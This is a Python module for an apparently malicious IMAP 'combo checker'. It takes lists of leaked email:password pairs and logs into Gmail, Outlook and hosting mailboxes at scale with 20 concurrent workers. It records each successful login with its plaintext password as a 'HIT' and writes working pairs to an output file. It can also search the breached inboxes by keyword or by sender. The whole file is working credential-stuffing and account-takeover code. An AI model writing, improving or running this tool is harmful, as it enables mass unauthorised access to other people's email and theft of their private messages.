import imaplib
import email
import email.header
import threading
import time
import re
from pathlib import Path
from typing import List, Tuple, Optional, Dict
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

from logger_setup import logger

# Timeout por conexion IMAP
IMAP_TIMEOUT = 15

# Maximo de hilos concurrentes
MAX_IMAP_WORKERS = 20

# Lock para escritura thread-safe
_write_lock = threading.Lock()

# Max emails to fetch headers from per keyword per account
MAX_EMAIL_HEADERS_PER_KW = 5

# v4.2.8 — Modo «por remitente»: tope de buzones reportados
MAX_SENDER_RESULTS = 10


def _detectar_tipo(correo: str) -> str:
    """Detectar tipo de correo segun dominio."""
    try:
        dominio = correo.split("@")[1].lower()
    except (IndexError, AttributeError):
        return "desconocido"
    if dominio in ("gmail.com", "googlemail.com"):
        return "gmail"
    if dominio in ("hotmail.com", "outlook.com", "live.com", "msn.com"):
        return "outlook"
    return "hosting"


def _servidor_imap(tipo: str, dominio: str) -> str:
    """Obtener servidor IMAP segun tipo."""
    if tipo == "gmail":
        return "imap.gmail.com"
    if tipo == "outlook":
        return "outlook.office365.com"
    if tipo == "hosting":
        return "imap." + dominio
    return "mail." + dominio


def _decode_header(header_value: str) -> str:
    """Decode email header (handles encoded words)."""
    if not header_value:
        return ""
    try:
        decoded_parts = email.header.decode_header(header_value)
        parts = []
        for part, charset in decoded_parts:
            if isinstance(part, bytes):
                parts.append(part.decode(charset or 'utf-8', errors='replace'))
            else:
                parts.append(part)
        return ' '.join(parts).strip()
    except Exception:
        return header_value

def _sanitize_filename(s: str) -> str:
    """Sanitize string for use as filename."""
    s = s.lower().strip()
    s = re.sub(r'[^a-z0-9._-]', '_', s)
    s = re.sub(r'_+', '_', s)
    s = s.strip('_')
    return s or 'unknown'


def _search_keywords_in_inbox(imap_conn, keywords: List[str]) -> Dict[str, list]:
    """Search keywords in the inbox of an already-logged-in IMAP connection.

    Returns:
        {keyword: [(subject, from_addr, date_str, match_count), ...]}
    """
    results = {}
    for kw in keywords:
        matches = []
        try:
            # Search TEXT searches subject, from, and body
            status, msg_ids = imap_conn.search(None, 'TEXT', kw)
            if status == 'OK' and msg_ids[0]:
                id_list = msg_ids[0].split()
                match_count = len(id_list)

                # Fetch headers for up to MAX_EMAIL_HEADERS_PER_KW messages
                for mid in id_list[:MAX_EMAIL_HEADERS_PER_KW]:
                    try:
                        status, msg_data = imap_conn.fetch(
                            mid, '(BODY[HEADER.FIELDS (SUBJECT FROM DATE)])'
                        )
                        if status == 'OK' and msg_data and msg_data[0] is not None:
                            raw_headers = msg_data[0][1]
                            if isinstance(raw_headers, bytes):
                                raw_headers = raw_headers.decode('utf-8', errors='replace')

                            subject = ''
                            from_addr = ''
                            date_str = ''

                            for line in raw_headers.split('\r\n'):
                                lower_line = line.lower()
                                if lower_line.startswith('subject:'):
                                    subject = _decode_header(line[8:].strip())
                                elif lower_line.startswith('from:'):
                                    from_addr = _decode_header(line[5:].strip())
                                elif lower_line.startswith('date:'):
                                    date_str = line[5:].strip()

                            # Extract just the date part (first ~16 chars)
                            if len(date_str) > 20:
                                date_str = date_str[:20].strip()

                            matches.append((subject, from_addr, date_str))
                    except Exception:
                        pass

                results[kw] = (match_count, matches)
            else:
                results[kw] = (0, [])
        except Exception:
            results[kw] = (0, [])

    return results


def _search_sender_in_inbox(imap_conn, sender: str) -> Optional[tuple]:
    """v4.2.8: buscar mensajes ENVIADOS POR `sender` en la bandeja de un buzón
    ya logueado (búsqueda IMAP FROM, mucho más precisa que TEXT).

    Returns:
        None si el buzón no tiene mensajes de ese remitente,
        o (sender_count, matches) con matches = [(subject, date_str), ...]
    """
    try:
        status, msg_ids = imap_conn.search(None, 'FROM', f'"{sender}"')
        if status != 'OK' or not msg_ids or not msg_ids[0]:
            return None
        id_list = msg_ids[0].split()
        sender_count = len(id_list)

        matches = []
        for mid in id_list[:MAX_EMAIL_HEADERS_PER_KW]:
            try:
                status, msg_data = imap_conn.fetch(
                    mid, '(BODY[HEADER.FIELDS (SUBJECT DATE)])'
                )
                if status == 'OK' and msg_data and msg_data[0] is not None:
                    raw_headers = msg_data[0][1]
                    if isinstance(raw_headers, bytes):
                        raw_headers = raw_headers.decode('utf-8', errors='replace')

                    subject = ''
                    date_str = ''
                    for line in raw_headers.split('\r\n'):
                        lower_line = line.lower()
                        if lower_line.startswith('subject:'):
                            subject = _decode_header(line[8:].strip())
                        elif lower_line.startswith('date:'):
                            date_str = line[5:].strip()
                    if len(date_str) > 20:
                        date_str = date_str[:20].strip()
                    matches.append((subject, date_str))
            except Exception:
                pass

        return sender_count, matches
    except Exception:
        return None


def _worker(combo: str, keywords: List[str] = None, sender: str = None) -> Optional[dict]:
    """Process a single combo mail:pass.

    Returns:
        None if bad (login fallido, combo inválido o —en modo sender— buzón
        sin mensajes del remitente), or dict with:
            combo, tipo, server, domain,
            keyword_results (if keywords provided),
            sender_count + sender_matches (if sender provided)
    """
    if ":" not in combo:
        return None

    email_addr, password = combo.split(":", 1)
    email_addr = email_addr.strip()
    password = password.strip()

    if not email_addr or not password or "@" not in email_addr:
        return None

    try:
        domain = email_addr.split("@")[1].lower()
    except (IndexError, AttributeError):
        return None

    tipo = _detectar_tipo(email_addr)
    imap_server = _servidor_imap(tipo, domain)

    imap = None
    try:
        imap = imaplib.IMAP4_SSL(imap_server, 993, timeout=IMAP_TIMEOUT)
        imap.login(email_addr, password)
        imap.select("INBOX")

        result = {
            "combo": f"{email_addr}:{password}",
            "tipo": tipo,
            "server": imap_server,
            "domain": domain,
        }

        # Search keywords if provided
        if keywords:
            result["keyword_results"] = _search_keywords_in_inbox(imap, keywords)

        # v4.2.8: modo «por remitente» — solo interesan buzones CON mensajes
        # enviados por esa dirección; sin mensajes → se descarta (None).
        if sender:
            found = _search_sender_in_inbox(imap, sender)
            if not found:
                return None
            result["sender_count"], result["sender_matches"] = found

        logger.info(f"[IMAP] HIT | {email_addr}:{password} | {tipo.upper()} | {imap_server}")
        return result

    except Exception:
        return None
    finally:
        if imap is not None:
            try:
                imap.logout()
            except Exception:
                pass


def imap_check_file(input_path: Path, output_path: Path,
                    keywords: List[str] = None, progress_callback=None,
                    sender: str = None, max_hits: int = None) -> dict:
    """Check combos via IMAP with controlled concurrency.

    Args:
        input_path: File with mail:pass combos
        output_path: Output file for hits
        keywords: Optional list of keywords to search in inbox
        progress_callback: Function called with (checked, total, hits)
        sender: v4.2.8 — buscar buzones con mensajes enviados por esta dirección
        max_hits: v4.2.8 — cortar el chequeo al alcanzar N hits (modo sender: 10)

    Returns:
        dict with: total, hits, bads, elapsed, hits_data (list of hit dicts)
    """
    with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ":" in line.strip()]

    total = len(combos)
    if total == 0:
        return {"total": 0, "hits": 0, "bads": 0, "elapsed": 0, "hits_data": []}

    hits_data = []
    bads_list = []
    checked = 0
    start_time = time.time()

    # Reduce workers if keywords/sender are provided (heavier per connection)
    workers = MAX_IMAP_WORKERS
    if keywords or sender:
        workers = max(5, MAX_IMAP_WORKERS // 2)

    with ThreadPoolExecutor(max_workers=workers, thread_name_prefix="imap") as executor:
        future_to_combo = {
            executor.submit(_worker, combo, keywords, sender): combo
            for combo in combos
        }

        for future in as_completed(future_to_combo):
            combo = future_to_combo[future]
            try:
                result = future.result()
                if result:
                    hits_data.append(result)
                else:
                    bads_list.append(combo)
            except Exception:
                bads_list.append(combo)

            with _write_lock:
                checked += 1

            if progress_callback and checked % 3 == 0:
                try:
                    progress_callback(checked, total, len(hits_data))
                except Exception:
                    pass

            # v4.2.8: tope de hits alcanzado (modo remitente, máx. 10) →
            # cancelar pendientes y detener el chequeo.
            if max_hits and len(hits_data) >= max_hits:
                for pending in future_to_combo:
                    pending.cancel()
                break

    # Write hits to file
    with open(output_path, 'w', encoding='utf-8', buffering=1024*64) as f:
        for h in hits_data:
            f.write(h["combo"] + '\n')

    elapsed = time.time() - start_time
    stats = {
        "total": total,
        "hits": len(hits_data),
        "bads": len(bads_list),
        "elapsed": elapsed,
        "hits_data": hits_data,
        "bads_list": bads_list,
    }

    logger.info(f"[IMAP] Check finalizado: {stats['hits']} hits de {stats['total']} en {elapsed:.1f}s")
    return stats
